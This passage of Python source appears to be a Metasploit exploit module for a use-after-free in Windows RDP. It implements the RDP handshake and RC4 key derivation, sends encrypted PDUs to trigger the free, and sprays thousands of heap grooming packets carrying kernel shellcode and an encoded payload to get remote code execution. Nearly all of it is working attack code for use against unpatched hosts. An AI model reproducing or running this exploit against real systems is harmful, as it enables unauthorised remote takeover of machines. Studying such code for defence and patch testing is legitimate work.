    masterSecret = rdp_salted_hash(preMasterSecret,"A",client_random,server_random) +  rdp_salted_hash(preMasterSecret,"BB",client_random,server_random) + rdp_salted_hash(preMasterSecret,"CCC",client_random,server_random)
    sessionKeyBlob = rdp_salted_hash(masterSecret,"X",client_random,server_random) +  rdp_salted_hash(masterSecret,"YY",client_random,server_random) + rdp_salted_hash(masterSecret,"ZZZ",client_random,server_random)
    initialClientDecryptKey128 = rdp_final_hash(sessionKeyBlob[16:32], client_random, server_random)
    initialClientEncryptKey128 = rdp_final_hash(sessionKeyBlob[32:48], client_random, server_random)

    macKey = sessionKeyBlob[0:16]

    '''
    print("PreMasterSecret = {}".format(bin_to_hex(preMasterSecret)))
    print("MasterSecret = {}".format(bin_to_hex(masterSecret)))
    print("sessionKeyBlob = {}".format(bin_to_hex(sessionKeyBlob)))
    print("macKey = {}".format(bin_to_hex(macKey)))
    print("initialClientDecryptKey128 = {}".format(bin_to_hex(initialClientDecryptKey128)))
    print("initialClientEncryptKey128 = {}".format(bin_to_hex(initialClientEncryptKey128)))
    '''

    return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob


def pdu_client_info():
    data = "000000003301000000000a000000000000000000"
    data+="75007300650072003000" # FIXME: username
    data+="000000000000000002001c00"
    data+="3100390032002e003100360038002e0031002e00320030003800" # FIXME: ip
    data+="00003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000"

    return binascii.unhexlify(data)


def pdu_client_confirm_active():
    data = "a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000"
    return binascii.unhexlify(data)


def pdu_client_persistent_key_list():
    data = "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    return binascii.unhexlify(data)

def rdp_encrypted_pkt(data, rc4enckey, hmackey, flags = "\x08\x00", flagsHi = "\x00\x00", channelId="\x03\xeb"):

    userData_len = len(data) + 12
    udl_with_flag = 0x8000 | userData_len
    pkt = "\x02\xf0\x80" # X.224
    pkt+= "\x64" # sendDataRequest
    pkt+= "\x00\x08" # intiator userId .. TODO: for a functional client this isn't static
    pkt+= channelId # channelId = 1003
    pkt+= "\x70" # dataPriority
    pkt+= binascii.unhexlify("%x"%udl_with_flag)
    pkt+= flags #{}"\x48\x00" # flags  SEC_INFO_PKT | SEC_ENCRYPT
    pkt+= flagsHi # flagsHi

    pkt+= rdp_hmac(hmackey, data)[0:8]
    pkt+= rdp_rc4_crypt(rc4enckey, data)

    tpkt = "\x03\x00"
    tpkt+=struct.pack(">h",len(pkt) + 4)
    tpkt+=pkt

    return tpkt

def try_check(s,rc4enckey, hmackey):
    for i in range(0,6):
        res = s.recv(1024)

    for i in range(0,6):
        pkt = rdp_encrypted_pkt(binascii.unhexlify("100000000300000000000000020000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
        s.sendall(pkt)
        pkt = rdp_encrypted_pkt(binascii.unhexlify("20000000030000000000000000000000020000000000000000000000000000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
        s.sendall(pkt)

        for i in range(0,4):
          res = s.recv(1024)
          if binascii.unhexlify("0300000902f0802180") in res:
            print("[+] Found MCS Disconnect Provider Ultimatum PDU Packet")

def msfprint(args, msg, level = 'info'):
    msg = "%s:%s - %s" % (args["RHOST"], args["RPORT"], msg)
    module.log(msg, level)

def exploit_foreal(args):
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (70000, 70000))

    host = args['RHOST']

    port=int(args['RPORT'])
    hostname="rstest"
    username="rstest"

    frag = Fragger(host, port)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    msfprint(args, "RDP connection established!",  'good')

    #print("[+] Verifying RDP Portocol....")
    x_224_conn_req = check_rdp_vuln(username)
    s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
    s.recv(8192)


    frag.frag_range(0, 10, 100)


    s.sendall(pdu_connect_initial(hostname))
    res = s.recv(10000)


    rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)


    s.sendall(mcs_erect_domain_pdu())

    s.sendall(msc_attach_user_pdu())

    res = s.recv(8192)
    mcs_packet = bytearray(res)
    user1= mcs_packet[9] + mcs_packet[10]

    #print("[+] Send PDU  Request for 7 channel with AttachUserConfirm::initiator: {}".format(user1))
    s.sendall(pdu_channel_request(user1, 1009))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1003))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1004))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1005))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1006))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1007))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1008))
    s.recv(8192)

    client_rand = "\x41" * 32
    rcran = bytes_to_bignum(client_rand)

    #print("[+] Sending security exchange PDU")
    s.sendall(pdu_security_exchange(rcran, rsexp, rsmod, bitlen))

    rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)

    '''
    print("- RC4_ENC_KEY: {}".format(bin_to_hex(rc4encstart)))
    print("- RC4_DEC_KEY: {}".format(bin_to_hex(rc4decstart)))
    print("- HMAC_KEY: {}".format(bin_to_hex(hmackey)))
    print("- SESS_BLOB: {}".format(bin_to_hex(sessblob)))
    '''
    rc4enckey = ARC4.new(rc4encstart)

    #print("[+] Sending encrypted client info PDU")
    s.sendall(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
    res = s.recv(8192)

    #print("[+] Received License packet: {}".format(bin_to_hex(res)))

    res = s.recv(8192)
    #print("[+] Received Server Demand packet: {}".format(bin_to_hex(res)))

    #print("[+] Sending client confirm active PDU")
    s.sendall(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))

    #print("[+] Sending client synchronize PDU")
    #print("[+] Sending client control cooperate PDU")
    synch = rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
    coop = rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
    s.sendall(synch + coop)

    #print("[+] Sending client control request control PDU")
    s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))

    #print("[+] Sending client persistent key list PDU")
    s.sendall(rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey))

    #print("[+] Sending client font list PDU")
    s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))

    #result = try_check(s,rc4enckey, hmackey)


    msfprint(args, "Completed 420-step RDP handshake!",  'good')

    frag.frag_range(11, 20, 100)
    #udata = "\x0d\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    #pkt = rdp_encrypted_pkt(udata, rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")

    msfprint(args, "Triggering the free.")
    pkt = rdp_encrypted_pkt(binascii.unhexlify("1100000003000000000000000000000002000000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
    s.sendall(pkt)


    msfprint(args, "Surfing channel grooms...")

    frag.frag_range(21, 46, 100)
    #msfprint(args, "Sleeping rq...")

    time.sleep(0.2)

    #msfprint(args, "Surfing more channel grooms...")

    frag.frag_range(47, 97, 100)


    #msfprint(args, "Building payload...")
    #msfprint(args, args['payload_encoded'])
    #shellcode = eternalblue_kshellcode_x64(b64decode(args['payload_encoded']))
    shellcode = eternalblue_kshellcode_x64() + b64decode(args['payload_encoded'])
    #msfprint(args, repr(shellcode))

    msfprint(args, "Sending large eggs...")

    sks = []
    for i in range(0, 3000):
        sk = send_large_groom(host, 445, shellcode)
        sks.append(sk)


    msfprint(args, "Using after free.")

    s.close()

    time.sleep(0.2)
    frag.frag_range(97, 100, 100)


    msfprint(args, "Exploit complete!", 'good')

    #pkt = rdp_encrypted_pkt(binascii.unhexlify("11000000030000000000000002000000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
    #s.sendall(pkt)

    #frag.frag_range(76, 100, 100)

    time.sleep(float(args['HoldGroomTime']))




def exploit(args):
    #msfprint(args, repr(args))
    #msfprint(args, dir(args))
    try:
        exploit_foreal(args)
    # XXX: Catch everything until we know better
    except Exception as e:
        module.log(str(e), 'error')
        sys.exit(1)

    #module.log('done')


if __name__ == '__main__':
    module.run(metadata, exploit)
